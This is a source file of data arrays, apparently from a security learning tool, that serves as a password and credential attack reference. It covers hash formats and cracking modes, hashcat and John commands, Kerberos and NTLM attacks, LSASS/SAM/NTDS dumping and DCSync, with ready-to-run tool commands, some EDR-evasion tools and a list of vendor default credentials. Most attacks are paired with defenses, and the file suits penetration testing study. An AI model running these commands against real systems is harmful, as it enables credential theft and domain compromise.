// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
//
// Password Attack Reference Database
// Hash types, cracking methodologies, credential attacks.

export const HASH_TYPES = [
  { name: "MD5", hashcatMode: 0, johnFormat: "raw-md5", length: 32, example: "5d41402abc4b2a76b9719d911017c592", speed: "~60 GH/s (RTX 4090)", description: "128-bit hash, cryptographically broken. Still widely used for checksums but never for passwords." },
  { name: "SHA-1", hashcatMode: 100, johnFormat: "raw-sha1", length: 40, example: "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d", speed: "~24 GH/s (RTX 4090)", description: "160-bit hash, collision attacks demonstrated (SHAttered, 2017). Deprecated for security." },
  { name: "SHA-256", hashcatMode: 1400, johnFormat: "raw-sha256", length: 64, example: "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824", speed: "~9 GH/s (RTX 4090)", description: "256-bit hash. Fast — not suitable for password storage without key stretching." },
  { name: "SHA-512", hashcatMode: 1700, johnFormat: "raw-sha512", length: 128, example: "cf83e1357eefb8bd...a3e78c18b6", speed: "~3 GH/s (RTX 4090)", description: "512-bit hash. Faster on 64-bit CPUs. Still too fast for password storage alone." },
  { name: "NTLM", hashcatMode: 1000, johnFormat: "nt", length: 32, example: "a4f49c406510bdcab6824ee7c30fd852", speed: "~100 GH/s (RTX 4090)", description: "Windows password hash (MD4 of UTF-16LE password). No salt. Extremely fast to crack." },
  { name: "NTLMv2 (Net-NTLMv2)", hashcatMode: 5600, johnFormat: "netntlmv2", length: "variable", example: "admin::DOMAIN:challenge:response:blob", speed: "~5 GH/s (RTX 4090)", description: "Network authentication hash captured via Responder/LLMNR poisoning. Contains username, domain, challenge, and response." },
  { name: "LM Hash", hashcatMode: 3000, johnFormat: "lm", length: 32, example: "aad3b435b51404eeaad3b435b51404ee", speed: "~250 GH/s (RTX 4090)", description: "Legacy Windows hash. Splits password into 7-char halves, uppercase only, no salt. Trivially cracked. Disabled since Vista." },
  { name: "bcrypt", hashcatMode: 3200, johnFormat: "bcrypt", length: 60, example: "$2b$12$WApznUPhDubN0oeveSXHp.WgFqel.o4Y4gXLKkTN0GnKSUoR6jLKG", speed: "~36 KH/s (RTX 4090, cost 12)", description: "Blowfish-based adaptive hash. Cost factor makes it intentionally slow. Standard for web application password storage." },
  { name: "scrypt", hashcatMode: 8900, johnFormat: "scrypt", length: "variable", example: "$7$DU..../....rl5vsDWjJ5kLsEBP...$kaal", speed: "~1 KH/s (RTX 4090)", description: "Memory-hard hash function. Requires significant RAM to compute, making GPU/ASIC cracking expensive." },
  { name: "Argon2id", hashcatMode: null, johnFormat: "argon2", length: "variable", example: "$argon2id$v=19$m=65536,t=3,p=4$salt$hash", speed: "~100 H/s", description: "Winner of Password Hashing Competition (2015). Memory-hard + CPU-hard. Recommended for new applications." },
  { name: "PBKDF2-SHA256", hashcatMode: 10900, johnFormat: "pbkdf2-hmac-sha256", length: "variable", example: "sha256:100000:salt:hash", speed: "~300 KH/s (100K iterations, RTX 4090)", description: "Key derivation function. Django default (600K iterations), .NET Identity. Speed depends on iteration count." },
  { name: "MySQL 5.x", hashcatMode: 300, johnFormat: "mysql-sha1", length: 40, example: "*6C8989366EAF6BCBBAB2A289B47127F4F5E5A4B5", speed: "~24 GH/s (RTX 4090)", description: "SHA1(SHA1(password)). Double SHA-1 with no salt. Prefixed with *." },
  { name: "PostgreSQL MD5", hashcatMode: 12, johnFormat: "postgres", length: 35, example: "md5a6f0847f739bfa05a6b5e8e5e4b8d9cd", speed: "~60 GH/s", description: "MD5(password+username). Prefixed with 'md5'. Salt is the username." },
  { name: "Oracle 11g", hashcatMode: 112, johnFormat: "oracle11", length: 60, example: "S:HASH_VALUE_HERE", speed: "~10 GH/s", description: "SHA-1 with 10-byte random salt. Prefixed with S:." },
  { name: "SHA-256 crypt ($5$)", hashcatMode: 7400, johnFormat: "sha256crypt", length: "variable", example: "$5$rounds=5000$salt$hash", speed: "~1 MH/s (5000 rounds)", description: "Linux SHA-256 crypt. Configurable rounds. Used in /etc/shadow." },
  { name: "SHA-512 crypt ($6$)", hashcatMode: 1800, johnFormat: "sha512crypt", length: "variable", example: "$6$rounds=5000$salt$hash", speed: "~500 KH/s (5000 rounds)", description: "Linux SHA-512 crypt. Default for modern Linux /etc/shadow. Configurable rounds." },
  { name: "MD5 crypt ($1$)", hashcatMode: 500, johnFormat: "md5crypt", length: "variable", example: "$1$salt$hash", speed: "~25 MH/s", description: "Legacy Linux password hash. 1000 MD5 iterations. Still found on older systems." },
  { name: "DES crypt", hashcatMode: 1500, johnFormat: "descrypt", length: 13, example: "rEK1ecacw.7.c", speed: "~250 GH/s", description: "Traditional Unix crypt. 2-char salt + 11-char hash. Max 8-char passwords. Ancient — avoid." },
  { name: "Kerberos TGS-REP (Kerberoasting)", hashcatMode: 13100, johnFormat: "krb5tgs", length: "variable", example: "$krb5tgs$23$*user$DOMAIN$SPN*$ticket", speed: "~500 MH/s", description: "Kerberos service ticket hash. Cracked offline after requesting TGS for SPNs. Major AD attack vector." },
  { name: "Kerberos AS-REP (AS-REP Roasting)", hashcatMode: 18200, johnFormat: "krb5asrep", length: "variable", example: "$krb5asrep$23$user@DOMAIN:salt$hash", speed: "~500 MH/s", description: "Kerberos AS-REP hash for accounts with 'Do not require pre-authentication' enabled." },
  { name: "WPA/WPA2 PBKDF2", hashcatMode: 22000, johnFormat: "wpapsk", length: "variable", example: "WPA*02*mic*...", speed: "~400 KH/s", description: "WiFi WPA/WPA2 PSK hash from captured 4-way handshake or PMKID." },
  { name: "MS Office 2013+", hashcatMode: 9600, johnFormat: "office", length: "variable", example: "$office$*2013*...", speed: "~20 KH/s", description: "AES-256 encryption with SHA-512 key derivation (100K iterations)." },
  { name: "7-Zip", hashcatMode: 11600, johnFormat: "7z", length: "variable", example: "$7z$...", speed: "~5 KH/s", description: "AES-256 encryption with SHA-256 key derivation. Very slow to crack." },
  { name: "KeePass", hashcatMode: 13400, johnFormat: "keepass", length: "variable", example: "$keepass$*2*...", speed: "~20 KH/s", description: "AES-256 or ChaCha20 with Argon2d/AES-KDF key derivation." },
  { name: "Bitcoin Wallet", hashcatMode: 11300, johnFormat: "bitcoin-opencl", length: "variable", example: "$bitcoin$...", speed: "~2 KH/s", description: "Wallet encryption key derived from password." },
  { name: "FileVault 2 (macOS)", hashcatMode: 16700, johnFormat: "fvde", length: "variable", example: "$fvde$...", speed: "~50 KH/s", description: "macOS full disk encryption password hash." },
  { name: "VeraCrypt", hashcatMode: "13711-13773", johnFormat: "veracrypt", length: "variable", example: "VeraCrypt header", speed: "~100 H/s", description: "Full disk encryption. Multiple KDF options (PBKDF2 with SHA-512/Whirlpool/Streebog, 500K+ iterations)." },
  { name: "MSSQL 2012+", hashcatMode: 1731, johnFormat: "mssql12", length: "variable", example: "0x0200...", speed: "~5 GH/s", description: "SHA-512 with 4-byte salt. Prefixed with 0x0200." },
  { name: "Django PBKDF2 SHA-256", hashcatMode: 10000, johnFormat: "django", length: "variable", example: "pbkdf2_sha256$600000$salt$hash", speed: "~50 KH/s (600K iterations)", description: "Django's default password hasher. Iteration count increased with each version." },
  { name: "Wordpress (phpass)", hashcatMode: 400, johnFormat: "phpass", length: 34, example: "$P$BjFEuUBBO/WQGmDmwECo5BXPEZXMHX/", speed: "~10 MH/s", description: "Portable PHP password hashing. 8192 MD5 iterations. Used by WordPress, Drupal 7, phpBB3." },
  { name: "Cisco IOS Type 5", hashcatMode: 500, johnFormat: "md5crypt", length: "variable", example: "$1$mERr$RQoL29sZKz9PCXBQ0K3UG1", speed: "~25 MH/s", description: "MD5 crypt — same as Linux $1$ format." },
  { name: "Cisco IOS Type 9", hashcatMode: 9300, johnFormat: "cisco9", length: "variable", example: "$9$...", speed: "~50 KH/s", description: "scrypt-based Cisco password hash." },
  { name: "macOS v10.8+ (PBKDF2-SHA512)", hashcatMode: 7100, johnFormat: "pbkdf2-hmac-sha512", length: "variable", example: "$ml$...", speed: "~100 KH/s", description: "macOS user password hash. High iteration PBKDF2-SHA512." }
];

export const CRACKING_METHODOLOGIES = [
  {
    name: "Dictionary Attack",
    description: "Try every word in a wordlist as the password.",
    hashcatCommand: "hashcat -m MODE -a 0 hashes.txt wordlist.txt",
    johnCommand: "john --wordlist=wordlist.txt hashes.txt",
    recommendedWordlists: [
      { name: "rockyou.txt", entries: "14.3M", description: "Classic wordlist from 2009 RockYou breach. The go-to starting point." },
      { name: "SecLists/Passwords/Common-Credentials", entries: "varies", description: "Curated password lists by Daniel Miessler" },
      { name: "CrackStation", entries: "1.5B", description: "Massive wordlist combining multiple breach databases" },
      { name: "Weakpass", entries: "varies", description: "Multiple targeted wordlists organized by size and source" },
      { name: "kaonashi.txt", entries: "115M", description: "High-quality combined and deduped wordlist" },
      { name: "hashmob.net", entries: "varies", description: "Community-sourced found passwords (founds list)" }
    ],
    effectiveness: "Cracks 60-70% of typical password databases when using a good wordlist."
  },
  {
    name: "Rule-Based Attack",
    description: "Apply transformation rules to each word in a wordlist to generate variations (capitalize, append numbers, leet speak, etc.).",
    hashcatCommand: "hashcat -m MODE -a 0 hashes.txt wordlist.txt -r best64.rule",
    builtInRules: [
      { name: "best64.rule", description: "64 most effective rules. Good starting point.", multiplier: "64x" },
      { name: "d3ad0ne.rule", description: "34K rules. Comprehensive coverage.", multiplier: "34,000x" },
      { name: "dive.rule", description: "99K rules. Deep rule set.", multiplier: "99,000x" },
      { name: "OneRuleToRuleThemAll.rule", description: "52K rules. Optimized from analyzing real cracked passwords.", multiplier: "52,000x" },
      { name: "Hob0Rules", description: "Multiple rule sets optimized for corporate environments.", multiplier: "varies" }
    ],
    ruleExamples: [
      { rule: ":", description: "No modification (original word)" },
      { rule: "l", description: "Lowercase: Password → password" },
      { rule: "u", description: "Uppercase: Password → PASSWORD" },
      { rule: "c", description: "Capitalize first: password → Password" },
      { rule: "t", description: "Toggle case: PassWord → pASSwORD" },
      { rule: "$1", description: "Append 1: password → password1" },
      { rule: "$!", description: "Append !: password → password!" },
      { rule: "^1", description: "Prepend 1: password → 1password" },
      { rule: "sa@", description: "Replace a with @: password → p@ssword" },
      { rule: "ss$", description: "Replace s with $: password → pa$$word" },
      { rule: "se3", description: "Replace e with 3: password → pa$$word (combined: sa@ss$se3)" },
      { rule: "d", description: "Duplicate: pass → passpass" },
      { rule: "r", description: "Reverse: password → drowssap" },
      { rule: "D3", description: "Delete char at position 3: password → pasword" },
      { rule: "i4!", description: "Insert ! at position 4: password → pass!word" }
    ],
    effectiveness: "Adds 70-90% more cracks on top of dictionary attack."
  },
  {
    name: "Mask / Brute Force Attack",
    description: "Try all possible combinations matching a pattern. Much faster than pure brute force when password pattern is known.",
    hashcatCommand: "hashcat -m MODE -a 3 hashes.txt ?u?l?l?l?l?l?d?d",
    charsets: [
      { mask: "?l", description: "Lowercase letter (a-z)", count: 26 },
      { mask: "?u", description: "Uppercase letter (A-Z)", count: 26 },
      { mask: "?d", description: "Digit (0-9)", count: 10 },
      { mask: "?s", description: "Special character (!\"#$%...)", count: 33 },
      { mask: "?a", description: "All printable ASCII (?l?u?d?s)", count: 95 },
      { mask: "?b", description: "All bytes (0x00-0xFF)", count: 256 },
      { mask: "?1", description: "Custom charset 1 (-1 option)", count: "custom" }
    ],
    commonPatterns: [
      { pattern: "?u?l?l?l?l?l?d?d", description: "Capitalized word + 2 digits (Password12)", keyspace: "3B" },
      { pattern: "?u?l?l?l?l?l?l?d?d?d?d", description: "Capitalized word + 4 digits (Password1234)", keyspace: "800B" },
      { pattern: "?u?l?l?l?l?l?l?l?d?s", description: "Capitalized word + digit + special (Password1!)", keyspace: "2.8T" },
      { pattern: "?d?d?d?d?d?d", description: "6-digit PIN (123456)", keyspace: "1M" },
      { pattern: "?d?d?d?d?d?d?d?d", description: "8-digit PIN (12345678)", keyspace: "100M" }
    ],
    effectiveness: "100% of keyspace covered. Limited by keyspace size — 8+ character all-printable-ASCII is usually infeasible."
  },
  {
    name: "Combinator Attack",
    description: "Combine words from two wordlists — each word from list 1 is concatenated with each word from list 2.",
    hashcatCommand: "hashcat -m MODE -a 1 hashes.txt wordlist1.txt wordlist2.txt",
    example: "If list1 has 'pass' and list2 has 'word123', tries 'password123'.",
    effectiveness: "Good for compound passwords like first+last name, word+word combinations."
  },
  {
    name: "Prince Attack",
    description: "Combines words from a single wordlist using intelligent generation — creates word chains of varying length.",
    hashcatCommand: "pp64.bin --pw-min=8 < wordlist.txt | hashcat -m MODE hashes.txt",
    effectiveness: "Good for passphrase-style passwords (correcthorsebatterystaple)."
  },
  {
    name: "Hybrid Attack",
    description: "Combine dictionary attack with mask — append or prepend mask pattern to dictionary words.",
    hashcatCommands: [
      { command: "hashcat -m MODE -a 6 hashes.txt wordlist.txt ?d?d?d?d", description: "Dict + append 4 digits: password → password1234" },
      { command: "hashcat -m MODE -a 7 hashes.txt ?d?d?d?d wordlist.txt", description: "Prepend 4 digits + dict: 1234 + password → 1234password" }
    ],
    effectiveness: "Very effective for the common pattern of word + numbers/symbols."
  }
];

export const CREDENTIAL_ATTACKS = {
  kerberos: [
    {
      name: "Kerberoasting",
      mitre: "T1558.003",
      description: "Request TGS tickets for service accounts with SPNs, then crack the tickets offline to recover service account passwords.",
      attackPath: [
        "Authenticate to AD with any domain user account",
        "Enumerate SPNs: setspn -T domain -Q */* or Get-ADUser -Filter {ServicePrincipalName -ne '$null'}",
        "Request TGS tickets: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPN'",
        "Extract tickets: Invoke-Kerberoast (PowerView) or GetUserSPNs.py (Impacket)",
        "Crack offline: hashcat -m 13100 tickets.txt wordlist.txt"
      ],
      tools: [
        { name: "Rubeus", command: "Rubeus.exe kerberoast /outfile:tickets.txt", description: "C# Kerberos abuse toolkit" },
        { name: "Impacket GetUserSPNs", command: "GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile tickets.txt", description: "Python-based Kerberoasting" },
        { name: "PowerView", command: "Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash", description: "PowerShell Kerberoasting" }
      ],
      defense: [
        "Use Managed Service Accounts (gMSA) with 120-char auto-rotating passwords",
        "Set long (25+ char) random passwords for service accounts with SPNs",
        "Monitor for mass TGS requests (Event ID 4769) from single source",
        "Use AES encryption for service accounts (harder to crack than RC4)",
        "Reduce service accounts with SPNs to minimum necessary"
      ]
    },
    {
      name: "AS-REP Roasting",
      mitre: "T1558.004",
      description: "Request AS-REP for accounts with 'Do not require Kerberos preauthentication' enabled, then crack offline.",
      attackPath: [
        "Enumerate accounts with DONT_REQ_PREAUTH flag",
        "Request AS-REP: GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat",
        "Crack: hashcat -m 18200 asrep.txt wordlist.txt"
      ],
      tools: [
        { name: "Rubeus", command: "Rubeus.exe asreproast /outfile:asrep.txt", description: "AS-REP roasting with Rubeus" },
        { name: "Impacket GetNPUsers", command: "GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP", description: "Python AS-REP roasting" }
      ],
      defense: [
        "Enable Kerberos preauthentication for all accounts",
        "Monitor for Event ID 4768 with pre-auth type 0 (no pre-auth)",
        "Regular audit of accounts with DONT_REQ_PREAUTH flag"
      ]
    },
    {
      name: "Pass-the-Hash (PtH)",
      mitre: "T1550.002",
      description: "Use an NTLM hash to authenticate without knowing the plaintext password. NTLM authentication only requires the hash, not the password.",
      tools: [
        { name: "Impacket psexec", command: "psexec.py DOMAIN/admin@TARGET -hashes :NTLM_HASH", description: "Remote command execution with hash" },
        { name: "Impacket wmiexec", command: "wmiexec.py DOMAIN/admin@TARGET -hashes :NTLM_HASH", description: "WMI-based execution with hash (stealthier)" },
        { name: "Impacket smbexec", command: "smbexec.py DOMAIN/admin@TARGET -hashes :NTLM_HASH", description: "SMB-based execution with hash" },
        { name: "CrackMapExec", command: "crackmapexec smb TARGETS -u admin -H NTLM_HASH", description: "Mass PtH across multiple targets" },
        { name: "Mimikatz", command: "sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe", description: "Pass-the-hash with Mimikatz" },
        { name: "evil-winrm", command: "evil-winrm -i TARGET -u admin -H NTLM_HASH", description: "WinRM shell with hash" }
      ],
      defense: [
        "Disable NTLM where possible — use Kerberos authentication",
        "Protected Users security group — disables NTLM for members",
        "Credential Guard — protects LSASS from credential dumping",
        "Local Administrator Password Solution (LAPS) — unique passwords per machine",
        "Restrict local admin lateral movement with deny-login GPO"
      ]
    },
    {
      name: "Pass-the-Ticket (PtT)",
      mitre: "T1550.003",
      description: "Steal or forge Kerberos tickets (TGT or TGS) to authenticate as the ticket owner without knowing their password.",
      tools: [
        { name: "Mimikatz", command: "kerberos::ptt ticket.kirbi", description: "Inject Kerberos ticket into current session" },
        { name: "Rubeus", command: "Rubeus.exe ptt /ticket:base64ticket", description: "Pass-the-ticket with Rubeus" },
        { name: "Impacket", command: "export KRB5CCNAME=ticket.ccache; psexec.py DOMAIN/user@TARGET -k -no-pass", description: "Use ccache ticket file" }
      ],
      variants: [
        { name: "Golden Ticket", description: "Forge TGT using KRBTGT hash — unlimited domain access for up to 10 years", command: "mimikatz: kerberos::golden /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_HASH /user:Administrator /ticket:golden.kirbi" },
        { name: "Silver Ticket", description: "Forge TGS for specific service using service account hash — targeted access without DC interaction", command: "mimikatz: kerberos::golden /domain:DOMAIN /sid:SID /target:server /service:cifs /rc4:SERVICE_HASH /user:admin /ticket:silver.kirbi" },
        { name: "Diamond Ticket", description: "Request legitimate TGT and modify it — harder to detect than Golden Ticket", command: "Rubeus.exe diamond /krbkey:AES_KEY /user:user /password:pass /enctype:aes /ticketuser:admin /dc:DC" }
      ],
      defense: [
        "Change KRBTGT password twice (to invalidate Golden Tickets)",
        "Monitor for TGT with unusual lifetime or issued in unusual patterns",
        "Enable Kerberos event logging (Event IDs 4768, 4769, 4770)",
        "Use AES encryption for Kerberos (more detectable when forged with RC4)"
      ]
    },
    {
      name: "NTLM Relay",
      mitre: "T1557.001",
      description: "Intercept NTLM authentication and relay it to a different service to authenticate as the victim without cracking their hash.",
      tools: [
        { name: "ntlmrelayx.py", command: "ntlmrelayx.py -tf targets.txt -smb2support", description: "Impacket NTLM relay framework" },
        { name: "ntlmrelayx to LDAP", command: "ntlmrelayx.py -t ldap://DC_IP --delegate-access", description: "Relay to LDAP for resource-based constrained delegation" },
        { name: "ntlmrelayx to ADCS", command: "ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController", description: "Relay to AD Certificate Services for certificate enrollment" },
        { name: "PetitPotam + ntlmrelayx", command: "PetitPotam.py LISTENER_IP DC_IP; ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs", description: "Coerce DC authentication and relay to ADCS for domain takeover" }
      ],
      coercionTechniques: [
        { name: "PetitPotam", description: "EFS-based authentication coercion — force machine account authentication", cve: "CVE-2021-36942" },
        { name: "PrinterBug / SpoolSample", description: "Print Spooler RPC coercion — force authentication via printer", tool: "SpoolSample.exe TARGET LISTENER" },
        { name: "DFSCoerce", description: "DFS-based authentication coercion", tool: "dfscoerce.py -d DOMAIN -u user -p pass LISTENER TARGET" },
        { name: "ShadowCoerce", description: "VSS-based authentication coercion", tool: "shadowcoerce.py -d DOMAIN -u user -p pass LISTENER TARGET" }
      ],
      defense: [
        "Enable SMB Signing on all systems (prevents SMB relay)",
        "Enable LDAP Signing and Channel Binding (prevents LDAP relay)",
        "Enable Extended Protection for Authentication (EPA) on web services",
        "Disable NTLM authentication where possible",
        "Disable Print Spooler on servers that don't need it"
      ]
    }
  ],
  credentialDumping: [
    {
      name: "LSASS Memory Dump",
      mitre: "T1003.001",
      description: "Dump LSASS (Local Security Authority Subsystem Service) process memory to extract plaintext passwords, NTLM hashes, and Kerberos tickets.",
      tools: [
        { name: "Mimikatz", command: "privilege::debug\nsekurlsa::logonpasswords", description: "The classic — extracts credentials from LSASS memory" },
        { name: "Procdump", command: "procdump.exe -ma lsass.exe lsass.dmp", description: "Sysinternals tool — dump LSASS to file for offline extraction" },
        { name: "comsvcs.dll", command: "rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump PID lsass.dmp full", description: "Native Windows DLL for process dumping — no external tools needed" },
        { name: "Task Manager", command: "Task Manager → Details → lsass.exe → Create dump file", description: "GUI method — creates dump in %temp%" },
        { name: "nanodump", command: "nanodump.exe --write C:\\temp\\lsass.dmp", description: "Stealthy LSASS dump — avoids common EDR detections" },
        { name: "HandleKatz", command: "handlekatz.exe --pid LSASS_PID", description: "Dump LSASS via handle duplication — bypasses some protections" }
      ],
      defense: [
        "Credential Guard — virtualizes LSASS, prevents credential extraction",
        "LSA Protection (RunAsPPL) — prevents non-PPL processes from accessing LSASS",
        "Disable WDigest (UseLogonCredential = 0) — prevents plaintext password caching",
        "EDR monitoring of LSASS access (OpenProcess with PROCESS_VM_READ)",
        "Attack Surface Reduction rules to block credential stealing from LSASS"
      ]
    },
    {
      name: "SAM Database Extraction",
      mitre: "T1003.002",
      description: "Extract password hashes from the Security Account Manager (SAM) database, which stores local user credentials.",
      tools: [
        { name: "reg.exe", command: "reg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive", description: "Save registry hives (requires SYSTEM/admin)" },
        { name: "Volume Shadow Copy", command: "wmic shadowcopy call create Volume=C:\\\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM .", description: "Copy SAM from shadow copy (bypasses file lock)" },
        { name: "secretsdump.py", command: "secretsdump.py -sam sam.hive -system system.hive LOCAL", description: "Extract hashes from saved hives" },
        { name: "Mimikatz", command: "lsadump::sam /sam:sam.hive /system:system.hive", description: "Mimikatz SAM dump from hive files" }
      ]
    },
    {
      name: "DCSync",
      mitre: "T1003.006",
      description: "Impersonate a Domain Controller using MS-DRSR replication protocol to request password hashes for any domain account, including KRBTGT.",
      prerequisite: "Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (Domain Admins, Enterprise Admins, or explicitly delegated).",
      tools: [
        { name: "Mimikatz", command: "lsadump::dcsync /domain:DOMAIN /user:krbtgt", description: "DCSync for KRBTGT hash (enables Golden Ticket)" },
        { name: "Impacket secretsdump", command: "secretsdump.py DOMAIN/admin:password@DC_IP", description: "Remote DCSync — dumps all domain hashes" },
        { name: "Mimikatz (all users)", command: "lsadump::dcsync /domain:DOMAIN /all /csv", description: "DCSync all domain user hashes" }
      ],
      defense: [
        "Monitor for DS-Replication-Get-Changes-All activity from non-DC sources (Event ID 4662)",
        "Restrict replication rights to DC machine accounts only",
        "Microsoft Advanced Threat Analytics / Defender for Identity detects DCSync"
      ]
    },
    {
      name: "NTDS.dit Extraction",
      mitre: "T1003.003",
      description: "Extract the Active Directory database file (NTDS.dit) from a Domain Controller to offline-extract all domain password hashes.",
      tools: [
        { name: "ntdsutil", command: "ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\temp' quit quit", description: "Built-in AD utility — creates install-from-media backup including NTDS.dit" },
        { name: "Volume Shadow Copy", command: "vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit .", description: "Copy NTDS.dit from shadow copy" },
        { name: "secretsdump.py (offline)", command: "secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL", description: "Extract hashes from NTDS.dit offline" },
        { name: "esentutl", command: "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\temp\\ntds.dit", description: "Copy locked NTDS.dit using VSS" }
      ],
      defense: [
        "Monitor for ntdsutil, vssadmin, and esentutl execution on DCs",
        "Restrict physical and RDP access to Domain Controllers",
        "Enable advanced audit logging on DC",
        "File integrity monitoring on NTDS.dit"
      ]
    }
  ],
  defaultCredentials: [
    { vendor: "Cisco", product: "IOS", username: "cisco", password: "cisco", note: "Also: admin/admin, enable password often cisco or class" },
    { vendor: "Cisco", product: "ASA", username: "cisco", password: "cisco", note: "ASDM default" },
    { vendor: "Juniper", product: "JunOS", username: "root", password: "(no password)", note: "Root login with no password on initial setup" },
    { vendor: "Palo Alto", product: "PAN-OS", username: "admin", password: "admin", note: "Default admin credentials" },
    { vendor: "Fortinet", product: "FortiGate", username: "admin", password: "(no password)", note: "Default admin with blank password" },
    { vendor: "F5", product: "BIG-IP", username: "admin", password: "admin", note: "Default management credentials" },
    { vendor: "Apache", product: "Tomcat", username: "tomcat", password: "tomcat", note: "Also: admin/admin, manager/manager" },
    { vendor: "Oracle", product: "WebLogic", username: "weblogic", password: "welcome1", note: "Default for development" },
    { vendor: "JBoss", product: "Application Server", username: "admin", password: "admin", note: "JMX Console default" },
    { vendor: "Jenkins", product: "Jenkins", username: "admin", password: "(initial setup password)", note: "Initial password in /var/lib/jenkins/secrets/initialAdminPassword" },
    { vendor: "Grafana", product: "Grafana", username: "admin", password: "admin", note: "Forces password change on first login (if not bypassed)" },
    { vendor: "Elasticsearch", product: "Elasticsearch", username: "elastic", password: "changeme", note: "X-Pack security default" },
    { vendor: "MongoDB", product: "MongoDB", username: "(none)", password: "(none)", note: "No auth by default — listens on 0.0.0.0:27017" },
    { vendor: "Redis", product: "Redis", username: "(none)", password: "(none)", note: "No auth by default — often exposed on port 6379" },
    { vendor: "PostgreSQL", product: "PostgreSQL", username: "postgres", password: "postgres", note: "Common dev default" },
    { vendor: "MySQL", product: "MySQL", username: "root", password: "(empty)", note: "Default root with no password on older versions" },
    { vendor: "MSSQL", product: "SQL Server", username: "sa", password: "sa", note: "Common weak SA password" },
    { vendor: "Dell", product: "iDRAC", username: "root", password: "calvin", note: "Dell server out-of-band management" },
    { vendor: "HP", product: "iLO", username: "Administrator", password: "(on tag)", note: "Printed on server tag, often left as default" },
    { vendor: "Supermicro", product: "IPMI", username: "ADMIN", password: "ADMIN", note: "BMC default credentials" },
    { vendor: "VMware", product: "ESXi", username: "root", password: "(set during install)", note: "Often weak in lab environments" },
    { vendor: "Ubiquiti", product: "UniFi", username: "ubnt", password: "ubnt", note: "SSH default for access points" },
    { vendor: "Netgear", product: "Router", username: "admin", password: "password", note: "Common consumer router default" },
    { vendor: "Linksys", product: "Router", username: "admin", password: "admin", note: "Consumer router default" },
    { vendor: "D-Link", product: "Router", username: "admin", password: "(empty)", note: "Admin with blank password" },
    { vendor: "TP-Link", product: "Router", username: "admin", password: "admin", note: "Consumer router default" },
    { vendor: "MikroTik", product: "RouterOS", username: "admin", password: "(empty)", note: "Admin with blank password" },
    { vendor: "Raspberry Pi", product: "Raspbian/PiOS", username: "pi", password: "raspberry", note: "Deprecated in newer versions but still commonly used" },
    { vendor: "Aruba", product: "Instant AP", username: "admin", password: "admin", note: "Default for standalone APs" },
    { vendor: "SonicWall", product: "Firewall", username: "admin", password: "password", note: "Default admin credentials" }
  ]
};
